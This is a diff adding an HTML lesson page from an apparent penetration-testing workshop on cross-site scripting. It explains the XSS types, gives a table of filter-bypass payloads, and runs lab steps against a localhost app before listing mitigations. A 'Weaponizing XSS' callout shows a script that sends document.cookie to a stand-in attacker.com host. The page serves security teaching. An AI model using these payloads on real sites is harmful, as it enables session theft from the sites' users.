@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VAPT Workshop - Cross-Site Scripting (XSS)</title>
+    <link rel="stylesheet" href="../../styles/theme.css">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800;900&family=Fira+Code&display=swap" rel="stylesheet">
+</head>
+<body>
+<div class="app-container">
+    
+
+    <nav class="sidebar">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 2.5rem;">
+            <span class="brand" style="margin-bottom: 0;">VAPT Workshop</span>
+            <button class="theme-toggle" id="themeToggle" onclick="toggleTheme()" title="Toggle Light/Dark Mode" style="position: static; padding: 0.5rem; border-radius: 50%; width: 40px; height: 40px; display: flex; justify-content: center; align-items: center;">
+                <span id="themeIcon" style="font-size: 1.2rem;">☀️</span>
+            </button>
+        </div>
+        <div class="nav-group">
+            <div class="nav-group-title">Table of Contents</div>
+            <ul class="nav-links">
+                <li><a href="../../index.html">Welcome & Intro</a></li>
+                <li><a href="../../modules/privilege-escalation/overview.html">Privilege Escalation</a></li>
+                <li><a href="../../modules/xss/overview.html" class="active">Cross-Site Scripting (XSS)</a></li>
+                <li><a href="../../modules/privesc-xss/overview.html">PrivEsc via XSS</a></li>
+                <li><a href="../../modules/metasploit/overview.html">Metasploit</a></li>
+                <li><a href="../../modules/exploitation/overview.html">Exploitation Frameworks</a></li>
+                <li><a href="../../modules/sqli/overview.html">SQL Injection</a></li>
+                <li><a href="../../modules/aitm/overview.html">AITM Attacks</a></li>
+                <li><a href="../../modules/password-attacks/overview.html">Password Attacks</a></li>
+                <li><a href="../../modules/network-pentesting/overview.html">Network Pentesting</a></li>
+                <li><a href="../../modules/wireless-pentesting/overview.html">Wireless Pentesting</a></li>
+                <li><a href="../../modules/social-engineering/overview.html">Social Engineering</a></li>
+                <li><a href="../../modules/security-controls/overview.html">Security Controls</a></li>
+                <li><a href="../../modules/physical-security/overview.html">Physical Security</a></li>
+                <li><a href="../../modules/reporting/overview.html">Reporting</a></li>
+            </ul>
+        </div>
+    </nav>
+    <main class="main-content" id="content-anchor">
+        <h1>Module: Cross-Site Scripting (XSS) Deep Dive</h1>
+
+<div class="glass-card">
+  <h2>1. Core Architectural Concept 🧠</h2>
+  <p><strong>Cross-Site Scripting (XSS)</strong> is a client-side vulnerability where malicious scripts are injected into otherwise benign and trusted websites. Unlike server-side vulnerabilities (like SQLi or Command Injection), XSS targets the <strong>users</strong> of the application, not the application backend itself.</p>
+  
+  <p>The core problem arises when an application includes untrusted data in a web page without proper validation or escaping (Content Security Policy violations). If an attacker can make a webpage execute their JavaScript in another user's browser, they have achieved XSS. Because the script is executed by the victim's browser, the malicious code can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site.</p>
+
+  <div class="callout tip">
+    <div class="icon">💡</div>
+    <div class="content"><strong>Pro Tip:</strong> XSS is effectively the ability to force a victim's browser to execute arbitrary JavaScript. Think of it less as "defacing a website" and more as "Remote Code Execution (RCE) inside a victim's web browser."</div>
+  </div>
+</div>
+
+<div class="glass-card">
+  <h2>2. The Three Pillars of XSS 🎯</h2>
+  <p>To truly understand XSS, you must differentiate between how the payload is delivered to the victim. There are three primary types of XSS.</p>
+
+  <h3>Type 1: Reflected XSS (Non-Persistent)</h3>
+  <p>The injected script is reflected off the web server, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request. The payload is usually delivered to the victim via a malicious link or phishing email.</p>
+  <div class="attack-flow">
+    <div class="flow-step">👨💻 Attacker crafts malicious URL `?q=&lt;script&gt;steal()&lt;/script&gt;`</div>
+    <div class="flow-arrow">↓</div>
+    <div class="flow-step target-step">📧 Phishing email sent to Victim with the link</div>
+    <div class="flow-arrow">↓</div>
+    <div class="flow-step target-step">🖱️ Victim clicks link, Server reflects the `q` param</div>
+    <div class="flow-arrow">↓</div>
+    <div class="flow-step hacker-step">💉 Victim Browser executes the JS instantly</div>
+  </div>
+
+  <h3>Type 2: Stored XSS (Persistent)</h3>
+  <p>The injected script is permanently stored on the target servers, such as in a database natively (e.g., in a forum post, visitor log, or comment field). The victim retrieves the malicious script when they navigate to the affected page.</p>
+  <div class="attack-flow">
+    <div class="flow-step">👨💻 Attacker submits comment: `Good post! &lt;script&gt;steal()&lt;/script&gt;`</div>
+    <div class="flow-arrow">↓</div>
+    <div class="flow-step target-step">💾 Server saves the raw comment to the database</div>
+    <div class="flow-arrow">↓</div>
+    <div class="flow-step target-step">🏃 Victim 1, Victim 2, and Admin loads the page</div>
+    <div class="flow-arrow">↓</div>
+    <div class="flow-step hacker-step">💉 Every victim's browser executes the JS instantly</div>
+  </div>
+
+  <h3>Type 3: DOM-Based XSS</h3>
+  <p>The vulnerability exists in client-side code rather than server-side code. The payload never even reaches the server; it is parsed entirely by the client's browser DOM (Document Object Model) via insecure sinks like `innerHTML` or `eval()`.</p>
+</div>
+
+<div class="glass-card">
+  <h2>3. Payload Arsenal & Bypasses ⚔️</h2>
+  <p>Modern applications usually deploy some form of Web Application Firewall (WAF) or basic sanitization. Attackers must use creative payloads to bypass them.</p>
+
+  <table style="width:100%; text-align: left; margin-top: 10px;">
+    <thead>
+      <tr>
+        <th>Bypass Technique</th>
+        <th>Payload Example</th>
+        <th>Why it works</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>Basic / No Filter</strong></td>
+        <td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+        <td>Standard execution context.</td>
+      </tr>
+      <tr>
+        <td><strong>Event Handler Injection</strong></td>
+        <td><code>&lt;img src=x onerror=alert(1)&gt;</code></td>
+        <td>Some WAFs block <code>&lt;script&gt;</code> tags entirely but forget about image `onerror` events.</td>
+      </tr>
+      <tr>
+        <td><strong>Link Protocol Injection</strong></td>
+        <td><code>&lt;a href="javascript:alert(1)"&gt;Click me&lt;/a&gt;</code></td>
+        <td>Executes JS when the user is tricked into clicking the anchor link.</td>
+      </tr>
+      <tr>
+        <td><strong>Case Manipulation</strong></td>
+        <td><code>&lt;sCRiPt&gt;alert(1)&lt;/ScRiPt&gt;</code></td>
+        <td>Bypasses poor regex filters that are case-sensitive matching strictly lowercase `script`.</td>
+      </tr>
+      <tr>
+        <td><strong>Encoded Payloads</strong></td>
+        <td><code>%3Cscript%3Ealert(1)%3C%2Fscript%3E</code></td>
+        <td>URL encoding is automatically decoded by the browser, but might slip past initial server WAFs.</td>
+      </tr>
+    </tbody>
+  </table>
+  
+  <div class="callout warning">
+    <div class="icon">⚠️</div>
+    <div class="content"><strong>Weaponizing XSS:</strong> `alert(1)` is just a Proof of Concept (PoC). In a real attack, the payload looks like:<br> <code>&lt;script&gt;fetch('https://attacker.com/log?cookie=' + btoa(document.cookie))&lt;/script&gt;</code></div>
+  </div>
+</div>
+
+<div class="glass-card">
+  <h2>4. Hands-on Lab 🧪</h2>
+  
+  <div class="lab-header">
+    <h3 class="lab-title">🧪 Lab: Reflected & Stored XSS Identification</h3>
+    <div class="lab-meta">
+      <span class="meta-badge">Topic: Web XSS</span>
+      <span class="meta-badge difficulty-easy">Difficulty: Easy</span>
+      <span class="meta-badge">Time: 30 mins</span>
+    </div>
+    
+    <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
+      <button onclick="startLab('xss')" class="btn-start-lab">▶ Start Xss Lab</button>
+      <button onclick="stopLab('xss')" class="btn-stop-lab">🛑 Stop Xss Lab</button>
+      <a href="http://localhost:3000" target="_blank" class="btn-start-lab" style="background: #8b5cf6;">🌐 Open Web App</a>
+    </div>
+    
+    <div id="console-xss" class="terminal-output" style="display: none; background: #0f172a; color: #10b981; font-family: monospace; padding: 15px; border-radius: 6px; margin-top: 15px; border: 1px solid #334155; max-height: 300px; overflow-y: auto; text-align: left;">
+        <span style="color: #64748b;">[System] Awaiting container initialization...</span>
+    </div>
+
+  </div>
+  
+  <div class="lab-content">
+    
+    <h4>Phase 1: Exploiting Reflected XSS</h4>
+    <p>Our lab endpoint at <code>http://localhost:3000/</code> has a Search feature. It does not sanitize input.</p>
+    <ol>
+      <li><strong>Test Normal behavior:</strong> Submit `apples`. Notice the page says `Search Results for: apples`.</li>
+      <li><strong>Test HTML Injection:</strong> Submit `&lt;u&gt;apples&lt;/u&gt;`. Notice the text is now underlined. This proves the DOM is parsing our input natively.</li>
+      <li><strong>Execute JS:</strong> Submit `&lt;script&gt;alert(document.domain)&lt;/script&gt;`. A popup box will appear showing `localhost`, proving arbitrary JS execution.</li>
+    </ol>
+    
+    <h4>Phase 2: Exploiting Stored XSS</h4>
+    <p>The same application has a "Discussion Board" at the bottom where you can leave persistent comments.</p>
+    <ol>
+      <li><strong>Submit Payload:</strong> In the Name field put `Hacker`. In the Comment field, put `<img src=x onerror="alert('Stored XSS Executed!')">`</li>
+      <li><strong>Post the Comment:</strong> Click Post. The page reloads, and the comment is saved.</li>
+      <li><strong>The Persistent Attack:</strong> Now, absolutely anyone (including the backend Admin) who visits <code>http://localhost:3000/</code> will instantly get that alert box popped on their screen automatically, because their browser attempted to load the broken image and triggered the `onerror` event!</li>
+    </ol>
+    
+    <h4>Fix / Mitigation Strategies</h4>
+    <p>XSS is solved by ensuring the browser treats user data as <strong>Content</strong>, never as <strong>Executable Code</strong>.</p>
+    <ul>
+      <li><strong>Context-Aware Output Encoding:</strong> Always encode characters like `&lt;`, `&gt;`, `&amp;`, `'`, `"` into their HTML entities (e.g., `&amp;lt;`) before rendering them on screen.</li>
+      <li><strong>Content Security Policy (CSP):</strong> Implement HTTP headers like `Content-Security-Policy: default-src 'self'` to strictly limit which domains can execute scripts on your site. This prevents inline scripts entirely.</li>
+      <li><strong>HttpOnly Flags:</strong> Set cookies (especially Session IDs) to `HttpOnly`. This prevents JavaScript (and thus XSS) from being able to read `document.cookie`, killing the session hijacking vector.</li>
+    </ul>
+  </div>
+</div>
+
+    <div class="content-nav">
+        <div><a href="../../modules/privilege-escalation/overview.html" class="content-nav-prev"><span>←</span> Privilege Escalation</a></div>
+        <div><a href="../../modules/privesc-xss/overview.html" class="content-nav-next"><span>→</span> Privesc Xss</a></div>
+    </div>
+    
+</main>
+</div>
+
+<script>
+    let logIntervals = {};
+
+    async function startLab(labName) {
+        const consoleDiv = document.getElementById('console-' + labName);
+        consoleDiv.style.display = 'block';
+        consoleDiv.innerHTML = '<span style="color: #64748b;">[System] Sending Boot command for ' + labName + '...</span><br>';
+        
+        try {
+            let res = await fetch('/api/start?lab=' + labName);
+            let data = await res.json();
+            if (data.status === 'error' || !res.ok) {
+                consoleDiv.innerHTML += '<span style="color: #ef4444;">[System Error] ' + (data.message || 'Failed to start lab') + '</span><br>';
+                return;
+            }
+            consoleDiv.innerHTML += '<span style="color: #3b82f6;">[System] ' + data.message + '</span><br>';
+            
+            // Start polling logs
+            if (logIntervals[labName]) clearInterval(logIntervals[labName]);
+            logIntervals[labName] = setInterval(() => pollLogs(labName), 2000);
+        } catch (e) {
+            consoleDiv.innerHTML += '<span style="color: #ef4444;">[System Error] ' + e + '</span><br>';
+        }
+    }
+
+    async function stopLab(labName) {
+        const consoleDiv = document.getElementById('console-' + labName);
+        consoleDiv.style.display = 'block';
+        consoleDiv.innerHTML += '<span style="color: #ef4444;">[System] Halting ' + labName + ' container...</span><br>';
+        
+        if (logIntervals[labName]) {
+            clearInterval(logIntervals[labName]);
+            delete logIntervals[labName];
+        }
+
+        try {
+            let res = await fetch('/api/stop?lab=' + labName);
+            let data = await res.json();
+            consoleDiv.innerHTML += '<span style="color: #64748b;">[System] ' + data.message + '</span><br>';
+        } catch (e) {
+            consoleDiv.innerHTML += '<span style="color: #ef4444;">[System Error] ' + e + '</span><br>';
+        }
+    }
+
+    async function pollLogs(labName) {
+        try {
+            let res = await fetch('/api/logs?lab=' + labName);
+            let data = await res.json();
+            const consoleDiv = document.getElementById('console-' + labName);
+            
+            if (data.status === 'success') {
+                // Ensure HTML is escaped to prevent breaking the DOM
+                let safeLogs = data.logs.replace(/</g, "&lt;").replace(/>/g, "&gt;");
+                // Replace newlines with <br>
+                safeLogs = safeLogs.replace(/\n/g, "<br>");
+                
+                // Keep the system header
+                const sysHeader = '<span style="color: #3b82f6;">[System] Streaming container logs...</span><br><br>';
+                consoleDiv.innerHTML = sysHeader + safeLogs;
+                
+                // Auto-scroll to bottom
+                consoleDiv.scrollTop = consoleDiv.scrollHeight;
+            }
+        } catch (e) {
+            console.error("Log poll failed", e);
+        }
+    }
+</script>
+
+<script>
+    // Theme toggling logic
+    function setTheme(isLight) {
+        if (isLight) {
+            document.documentElement.classList.add('light-theme');
+            document.getElementById('themeIcon').innerText = '🌙';
+            
+            localStorage.setItem('vapt-theme', 'light');
+        } else {
+            document.documentElement.classList.remove('light-theme');
+            document.getElementById('themeIcon').innerText = '☀️';
+            
+            localStorage.setItem('vapt-theme', 'dark');
+        }
+    }
+
+    function toggleTheme() {
+        const isLight = !document.documentElement.classList.contains('light-theme');
+        setTheme(isLight);
+    }
+
+    // Initialize theme based on localStorage
+    const savedTheme = localStorage.getItem('vapt-theme');
+    if (savedTheme === 'light') {
+        setTheme(true);
+    }
+</script>
+
+</body>
+
+</html>
